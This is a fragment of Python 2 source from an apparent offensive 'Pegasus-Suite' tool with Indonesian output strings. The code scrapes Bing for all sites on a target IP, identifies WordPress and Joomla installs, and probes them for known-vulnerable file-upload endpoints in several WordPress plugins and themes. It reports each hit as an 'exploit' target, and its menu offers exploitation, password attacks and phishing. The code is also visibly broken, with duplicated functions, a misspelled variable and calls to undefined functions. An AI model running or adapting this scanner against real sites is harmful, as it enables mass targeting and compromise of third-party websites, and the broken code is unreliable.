                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final
def check_wordpress(sites) :
    wp = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-login.php').getcode() == 200 :
                wp.append(site)
        except :
            pass

    return wp
def check_joomla(sites) :
    joomla = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'administrator').getcode() == 200 :
                joomla.append(site)
        except :
            pass

    return joomla
def wppjmla():
    
    ipp = raw_input('Masukkan target IP: ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print(ss)
    print('[+] Dapat ! ', len(wordpress), ' Wordpress Websites')
    print('-'*30+'\n')
    for ss in joomla:
        print(ss)


    print('[+] Dapat ! ', len(joomla), ' Joomla Websites')

    print('\n')
#initialise the tnscan function 
class tnn():
    def __init__(self):
        clearScr()
        aaa = raw_input("Target IP : ")
        TNscan(aaa)
############################
class bcolors:
    HEADER = ''
    OKBLUE = ''
    OKGREEN = ''
    WARNING = ''
    FAIL = ''
    ENDC = ''
    CYAN = ''
class colors():
    PURPLE = ''
    CYAN = ''
    DARKCYAN = ''
    BLUE = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    BOLD = ''
    ENDC = ''
def grabsqli(ip):
    try:
        print(bcolors.OKBLUE  + "Check_Uplaod... ")
        print('\n')

        page = 1
        while page <= 21:
                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+upload&count=50&first="+str(page)
                openbing  = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
                sites = findwebs
                for i in sites :
                            try :
                                      response = urllib2.urlopen(i).read()                                   
                                      checksqli(i)  
                            except urllib2.HTTPError as e:
                                       str(sites).strip(i)
                                   
                page = page + 10 
    except : 
         pass 
def checksqli(sqli):
                            responsetwo = urllib2.urlopen(sqli).read()
                            find = re.findall('type="file"',responsetwo)
                            if find:
                                            print(" Dapat ==> " + sqli)
def sqlscan():                                           
    ip = raw_input('Enter IP : ')
    grabsqli(ip)
# Dapat this code on stackoverflow.com/questions/19278877
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final
def check_wordpress(sites) :
    wp = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-login.php').getcode() == 200 :
                wp.append(site)
        except :
            pass

    return wp
def check_wpstorethemeremotefileupload(sites) :
    wpstorethemeremotefileupload = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-content/themes/WPStore/upload/index.php').getcode() == 200 :
                wpstorethemeremotefileupload.append(site)
        except :
            pass

    return wpstorethemeremotefileupload
def check_wpcontactcreativeform(sites) :
    wpcontactcreativeform = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200 :
                wpcontactcreativeform.append(site)
        except :
            pass

    return wpcontactcreativeform
def check_wplazyseoplugin(sites) :
    wplazyseoplugin = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200 :
                wplazyseoplugin.append(site)
        except :
            pass

    return wplazyseoplugin
def check_wpeasyupload(sites) :
    wpeasyupload = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200 :
                wpeasyupload.append(site)
        except :
            pass

    return wpeasyupload
def check_wpsymposium(sites) :
    wpsymposium = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-symposium/server/file_upload_form.php').getcode() == 200 :
                wpsycmium.append(site)
        except :
            pass

    return wpsymposium
def wpminiscanner():
    ip = raw_input('Enter IP : ')
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
    wpcontactcreativeform = check_wpcontactcreativeform(sites)
    wplazyseoplugin = check_wplazyseoplugin(sites)
    wpeasyupload = check_wpeasyupload(sites)
    wpsymposium = check_wpsymposium(sites)
    for ss in wordpress:
        print(ss)
    print('[*] Dapat, ', len(wordpress), ' wordpress sites.')
    print('-'*30+'\n')
    for ss in wpstorethemeremotefileupload:
        print(ss)
    print('[*] Dapat, ', len(wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.')
    print('-'*30+'\n')
    for ss in wpcontactcreativeform:
        print(ss)
    print('[*] Dapat, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.')
    print('-'*30+'\n')
    for ss in wplazyseoplugin:
        print(ss)
    print('[*] Dapat, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.')
    print('-'*30+'\n')
    for ss in wpeasyupload:
        print(ss)
    print('[*] Dapat, ', len(wpeasyupload), ' wp_easyupload exploit.')
    print('-'*30+'\n')
    for ss in wpsymposium:
        print(ss)


    print('[*] Dapat, ', len(wpsymposium), ' wp_sympsiup exploit.')

    print('\n')
############################
# Fix for menu function (it was defined as a dictionary instead of a function)
# Define a new menu function before the __main__ section
def main_menu():
    clearScr()
    print("""
    ######################################################
    #                                                    #
    #       PEGASUS-SUITE - All-In-One Security Suite    #
    #                      dr. Sobri                     #
    ######################################################
    
    1. Information Gathering
    2. Vulnerability Assessment
    3. Web Application Security
    4. Network Security
    5. Wireless Security
    6. Password Attacks
    7. Exploitation
    8. Post Exploitation
    9. Social Engineering
    10. Reverse Engineering
    11. Forensics
    12. Cryptography
    13. Mobile Security
    14. Cloud Security
    15. IoT Security
    16. ICS/SCADA Security
    17. Malware Analysis
    18. OSINT
    19. Privacy Tools
    20. Reporting Tools
    99. Settings
    0. Exit
    """)
    
    choice = input("Select an option: ")
    
    try:
        choice = int(choice)
        if choice == 0:
            print("Exiting Pegasus-Suite...")
            sys.exit(0)
        elif choice == 1:
            network_discovery()
        elif choice == 2:
            auto_vuln_scan()
        elif choice == 3:
            sql_injection_testing()
        elif choice == 4:
            network_scanning()
        elif choice == 5:
            wifi_network_scanner()
        elif choice == 6:
            dictionary_attack()
        elif choice == 7:
            remote_exploitation()
        elif choice == 8:
            privilege_escalation()
        elif choice == 9:
            phishing_campaigns()
        elif choice == 10:
            reverse_engineering_menu()
        elif choice == 11:
            forensics_menu()
        elif choice == 12:
            crypto_menu()
        elif choice == 13:
            mobile_menu()
        elif choice == 14:
            cloud_menu()
        elif choice == 15:
            iot_menu()
        elif choice == 16:
            ics_menu()
        elif choice == 17:
            malware_menu()
        elif choice == 18:
            osint_menu()
        elif choice == 19:
            privacy_menu()
        elif choice == 20:
            reporting_menu()
        elif choice == 99:
            settings_menu()
        else:
            print("Invalid option. Please try again.")
            main_menu()
    except ValueError:
        print("Please enter a number.")
        main_menu()

# Define menu dictionary after all functions are defined
menu = {
    "Information Gathering": network_discovery,
    "Vulnerability Assessment": auto_vuln_scan,
    "Web Application Security": sql_injection_testing,
    "Network Security": network_scanning,
    "Wireless Security": wifi_network_scanner,
    "Password Attacks": dictionary_attack,
    "Exploitation": remote_exploitation,
    "Post Exploitation": privilege_escalation,
    "Social Engineering": phishing_campaigns,
    "Reverse Engineering": reverse_engineering_menu,
    "Forensics": forensics_menu,
    "Cryptography": crypto_menu,
    "Mobile Security": mobile_menu,
    "Cloud Security": cloud_menu,
    "IoT Security": iot_menu,
    "ICS/SCADA Security": ics_menu,
    "Malware Analysis": malware_menu,
    "OSINT": osint_menu,
    "Privacy Tools": privacy_menu,
    "Reporting Tools": reporting_menu,
    "Settings": settings_menu
}

############################
#begin :D 
if __name__ == "__main__":
  main_menu()

    
    
    
  
